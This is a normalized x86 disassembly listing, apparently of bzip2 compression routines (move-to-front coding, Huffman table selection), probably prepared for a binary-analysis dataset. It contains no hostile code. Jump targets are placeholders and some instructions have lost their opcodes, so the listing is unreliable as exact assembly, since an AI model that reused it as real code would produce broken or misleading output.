movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_10014f20
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edi ]
movzx ecx al
movzx eax [ ebx + eax * 2 ]
and cl 0x1
shl cl 0x2
shr edx cl
and edx 0xf
shl edx 0x10
or edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x38 ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
and [ esi + 0x18 ] 0x0
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec [ esi + 0x14 ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x14 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
xor eax eax
cmp ecx 0x1
movzx ecx [ ebp - 0x1 ]
sete al
xor eax ecx
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_10014f20
mov edx [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx edx
shr ecx 0x1
mov [ esi + 0x3c ] eax
movzx edi [ ecx + edi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
movzx ecx [ ebx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
mov ecx [ esi + 0x14 ]
mov [ esi + 0x38 ] edi
test ecx ecx
jne r-xdata
and [ esi + 0x18 ] 0x0
dec [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
xor edx edx
cmp ecx 0x1
sete dl
xor edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x3c ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx * 4 + rw-data ]
inc ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] ecx
cmp ecx 0x200
jne r-xdata
and [ esi + 0x18 ] 0x0
sub_1001556d
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop esi
retn
cmp [ esi ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
push ebx
cmp ecx 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ecx 0x2
jne r-xdata
pop ebx
pop esi
retn
mov ecx [ esi + 0x4 ]
cmp ecx 0xa
jl r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov ebx esi
call sub_10017508
cmp eax 0x4
je r-xdata
mov ecx esi
call sub_10014a74
call sub_10014f4d
jmp r-xdata
cmp [ esi + 0x30 ] 0x3
jl r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0x2
jne r-xdata
push 0xfffffffc
pop eax
jmp r-xdata
mov eax [ esi + 0xfa40 ]
inc eax
cmp [ esi + 0x440 ] eax
jne r-xdata
test al al
jne r-xdata
mov eax [ esi + 0xc64 ]
sub eax [ esi + 0xc5c ]
neg eax
sbb eax eax
and eax 0xfffffff8
add eax 0x4
push [ esi + 0xc64 ]
push [ esi + 0xc5c ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x30 ] 0x3
mov eax [ esi + 0xc60 ]
not eax
mov [ esi + 0xc60 ] eax
jl r-xdata
cmp [ esi + 0x30 ] 0x2
jl r-xdata
push eax
push [ esi + 0xc58 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x10
mov ecx [ esi + 0xc60 ]
cmp ecx [ esi + 0xc58 ]
jne r-xdata
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
lea eax [ esi + 0xc64 ]
mov edx [ eax ]
rol edx 0x1
xor edx ecx
mov [ eax ] edx
mov [ esi + 0x4 ] 0xe
sub_100156b9
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0xc4c ]
test eax eax
je r-xdata
mov eax [ edi + 0xc50 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0xc54 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_1001571e
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi eax
xor eax eax
push edi
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp esi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_10014450
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ esi ]
mov [ ebp - 0x1c ] eax
mov eax edi
mov [ ebp - 0x20 ] ebx
call sub_10014922
mov edi eax
cmp edi 0x3
jne r-xdata
cmp edi 0x4
jne r-xdata
push 0xfffffff8
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_10014999
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub [ esi ] eax
xor edi edi
sub_10015794
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
mov edi eax
mov ebx ecx
xor eax eax
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp edi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea esi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_100149f5
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ edi ]
mov [ ebp - 0x1c ] eax
mov eax esi
mov [ ebp - 0x20 ] ebx
call sub_1001556d
mov ebx eax
test ebx ebx
jne r-xdata
cmp ebx 0x4
je r-xdata
cmp [ ebp - 0x1c ] eax
jbe r-xdata
mov eax [ ebp - 0x1c ]
sub [ edi ] eax
xor edi edi
lea esi [ ebp - 0x30 ]
call sub_100156b9
mov eax ebx
jmp r-xdata
push 0xfffffff8
jmp r-xdata
push 0xfffffff9
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_100156b9
mov eax edi
jmp r-xdata
sub_10015822
cmp [ eax + 0x25c ] 0x8
push esi
push edi
mov esi ecx
jl r-xdata
mov edx [ eax + 0x25c ]
mov edi [ esp + 0xc ]
push 0x20
pop ecx
sub ecx edx
sub ecx edi
shl esi cl
add edx edi
pop edi
mov [ eax + 0x25c ] edx
or [ eax + 0x258 ] esi
pop esi
retn
lea ecx [ eax + 0x258 ]
push ebx
mov edi [ eax + 0x4c ]
mov bl [ ecx + 0x3 ]
mov edx [ eax + 0x2c ]
mov [ edx + edi ] bl
inc [ eax + 0x4c ]
shl [ ecx ] 0x8
add [ eax + 0x25c ] 0xfffffff8
cmp [ eax + 0x25c ] 0x8
jge r-xdata
pop ebx
sub_1001587d
push esi
mov ecx ebx
shr ecx 0x18
push 0x8
call sub_10015822
mov ecx ebx
shr ecx 0x10
mov esi 0xff
and ecx esi
push 0x8
call sub_10015822
mov ecx ebx
shr ecx 0x8
and ecx esi
push 0x8
call sub_10015822
movzx ecx bl
push 0x8
call sub_10015822
add esp 0x10
pop esi
retn
sub_100158ba
push ebp
lea ebp [ esp - 0x9c ]
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x98 ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x80 ] eax
mov eax [ esi + 0x24 ]
push ebx
mov ebx [ esi + 0x28 ]
mov [ ebp - 0x7c ] eax
xor eax eax
push edi
mov [ esi + 0x54 ] eax
inc eax
cmp eax 0x100
jl r-xdata
mov cl [ esi + 0x54 ]
mov [ eax + esi + 0x158 ] cl
inc [ esi + 0x54 ]
cmp [ esi + eax + 0x58 ] 0x0
je r-xdata
mov edx [ esi + 0x54 ]
inc edx
mov [ ebp - 0x78 ] edx
js r-xdata
xor eax eax
xor edi edi
cmp [ esi + 0x54 ] eax
mov [ ebp - 0x70 ] eax
jle r-xdata
lea edi [ esi + 0x278 ]
lea ecx [ edx + 0x1 ]
xor eax eax
[ edi ]
and [ ebp - 0x74 ] 0x0
cmp [ esi + 0x44 ] 0x0
jle r-xdata
mov ecx [ esi + 0x54 ]
mov ecx [ ebp + 0x98 ]
mov [ ebx + edi * 2 ] dx
lea eax [ esi + edx * 4 + 0x278 ]
inc [ eax ]
inc edi
mov [ esi + 0x274 ] edi
pop edi
xor ecx ebp
pop ebx
call sub_10020040
add ebp 0x9c
leave
retn
mov eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x74 ]
mov eax [ eax + ecx * 4 ]
dec eax
jns r-xdata
mov [ ebp + eax - 0x68 ] al
inc eax
cmp eax ecx
jl r-xdata
mov ecx [ ebp - 0x7c ]
movzx eax [ eax + ecx ]
mov al [ eax + esi + 0x158 ]
mov [ ebp - 0x69 ] al
cmp [ ebp - 0x68 ] al
jne r-xdata
add eax [ esi + 0x44 ]
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov al [ ebp - 0x68 ]
mov cl [ ebp - 0x67 ]
mov [ ebp - 0x67 ] al
lea eax [ ebp - 0x67 ]
jmp r-xdata
dec eax
inc [ ebp - 0x74 ]
mov eax [ ebp - 0x74 ]
cmp eax [ esi + 0x44 ]
jl r-xdata
cmp [ ebp - 0x69 ] cl
jne r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc eax
mov dl cl
mov cl [ eax ]
mov [ eax ] dl
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x68 ] cl
lea ecx [ ebp - 0x68 ]
sub eax ecx
lea ecx [ eax + 0x1 ]
mov [ ebx + edi * 2 ] cx
lea eax [ esi + eax * 4 + 0x27c ]
inc edi
inc [ eax ]
and [ ebp - 0x70 ] 0x0
add eax 0xfffffffe
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
dec eax
xor ecx ecx
test al 0x1
je r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
add eax 0xfffffffe
cdq
sub eax edx
mov edx [ ebp - 0x78 ]
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
xor ecx ecx
test al 0x1
je r-xdata
sub_10015a50
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x268 ] 0x3
push ebx
mov ebx [ esi + 0x28 ]
push edi
jl r-xdata
mov edi [ esi + 0x54 ]
inc edi
inc edi
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x3c ] edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x28 ] 0x6
push [ esi + 0x54 ]
push [ esi + 0x274 ]
push [ esi + 0x44 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0x14
add [ ebp - 0xc ] 0x102
dec [ ebp - 0x28 ]
jne r-xdata
push edi
push 0xf
push [ ebp - 0xc ]
call sub_100209e0
add esp 0xc
test edi edi
jle r-xdata
mov eax [ esi + 0x274 ]
test eax eax
jg r-xdata
cmp eax 0xc8
jge r-xdata
push 0xbb9
cmp eax 0x258
jge r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp eax 0x4b0
jge r-xdata
mov [ ebp - 0x30 ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x30 ]
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] eax
test ecx ecx
jle r-xdata
xor ecx ecx
cmp eax 0x960
setge cl
add ecx 0x5
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x30 ] 0x4
jmp r-xdata
and [ ebp - 0x34 ] 0x0
and [ ebp - 0xc ] 0x0
mov eax ecx
add eax 0x91
imul eax eax 0x102
add eax esi
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
mov ecx [ ebp - 0x30 ]
xor eax eax
lea edi [ ebp - 0x5c ]
[ edi ]
mov eax [ ebp - 0x30 ]
lea edx [ esi + 0xb160 ]
mov [ ebp - 0x28 ] eax
cmp edi [ ebp - 0x24 ]
jle r-xdata
lea edx [ esi + edi * 4 + 0x278 ]
mov ecx [ esi + 0x274 ]
xor eax eax
cmp ecx eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
add edx 0x408
dec [ ebp - 0x28 ]
jne r-xdata
mov ecx [ ebp - 0x3c ]
xor eax eax
mov edi edx
[ edi ]
cmp [ esi + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
add edx 0x4
add ecx [ edx ]
inc edi
cmp ecx [ ebp - 0x28 ]
mov [ ebp - 0x40 ] ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea edx [ eax + 0x31 ]
cmp edx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x2c ] edx
jl r-xdata
mov edx [ ebp - 0x3c ]
lea eax [ esi + 0x9324 ]
lea ecx [ esi + 0xc994 ]
mov [ ebp - 0x28 ] edx
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
xor eax eax
cmp [ ebp - 0x3c ] eax
jle r-xdata
fild [ ebp - 0x40 ]
push ecx
push ecx
fmul [ r--data ]
fidiv [ esi + 0x274 ]
fstp [ esp ]
push [ ebp - 0x40 ]
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x34 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
mov ecx [ ebp - 0x40 ]
add esp 0x20
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x3c ]
dec eax
cmp edi eax
jge r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
push eax
mov eax [ ebp - 0x34 ]
inc eax
push eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
xor edi edi
add esp 0x10
cmp [ ebp - 0x30 ] edi
jle r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
jle r-xdata
dec ecx
mov [ ebp - 0x2c ] ecx
movzx edx [ eax + 0x102 ]
movzx edi [ eax ]
shl edx 0x10
or edx edi
mov [ ecx - 0x4 ] edx
movzx edx [ eax + 0x306 ]
movzx edi [ eax + 0x204 ]
shl edx 0x10
or edx edi
mov [ ecx ] edx
movzx edx [ eax + 0x50a ]
movzx edi [ eax + 0x408 ]
shl edx 0x10
or edx edi
mov [ ecx + 0x4 ] edx
inc eax
add ecx 0x10
dec [ ebp - 0x28 ]
jne r-xdata
dec [ ebp - 0x34 ]
sub [ ebp - 0x2c ] 0x102
inc [ ebp - 0xc ]
sub [ ebp - 0x20 ] ecx
inc edi
cmp [ ebp - 0x34 ] 0x0
mov [ ebp - 0x24 ] edi
jg r-xdata
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0xc ]
and eax 0x80000001
jns r-xdata
inc [ ebp - 0x34 ]
cmp [ ebp - 0x34 ] 0x4
jl r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x30 ]
lea edi [ esi + 0xb160 ]
mov [ ebp - 0xc ] eax
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
push [ ebp + edi * 4 - 0x5c ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
inc edi
cmp edi [ ebp - 0x30 ]
jl r-xdata
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
lea edi [ ebp - 0x18 ]
[ edi ]
adc ecx ecx
[ edi ]
mov eax [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
cdq
idiv [ ebp - 0x34 ]
mov edi [ ebp - 0x24 ]
xor ecx ecx
dec edi
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x28 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x2c ]
mov [ edx + eax ] 0xf
cmp eax edi
jg r-xdata
cmp eax 0x1
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
cmp [ ebp - 0x30 ] 0x8
jl r-xdata
push [ ebp - 0x3c ]
mov ecx edi
push [ ebp - 0x28 ]
call sub_1001a94d
add [ ebp - 0x28 ] 0x102
pop ecx
add edi 0x408
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
cmp eax [ ebp - 0x2c ]
mov ecx eax
jmp r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx eax
inc ecx
cmp ecx 0x32
jne r-xdata
mov edx [ ebp - 0x2c ]
mov [ edx + eax ] 0x0
jmp r-xdata
sub ecx [ esi + edi * 4 + 0x278 ]
dec edi
mov [ ebp - 0x40 ] ecx
mov ecx [ ebp - 0x40 ]
cmp ecx 0x8000
jge r-xdata
push 0xbba
jmp r-xdata
mov [ ebp - 0x24 ] ecx
jle r-xdata
mov eax [ ebp - 0x24 ]
lea edi [ ebx + eax * 2 ]
movzx eax [ edi ]
movzx edi [ edi + 0x2 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
movzx ecx ax
lea eax [ ecx + 0xc99 ]
shl eax 0x4
mov eax [ eax + esi ]
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
shl ecx 0x4
lea edx [ ecx + esi ]
mov ecx [ edx + 0xc994 ]
add ecx [ edi + 0xc994 ]
mov edx [ edx + 0xc998 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x6 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x8 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xa ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xc ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xe ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x10 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x12 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x14 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x16 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x18 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x20 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x22 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x24 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x26 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x28 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x30 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x32 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
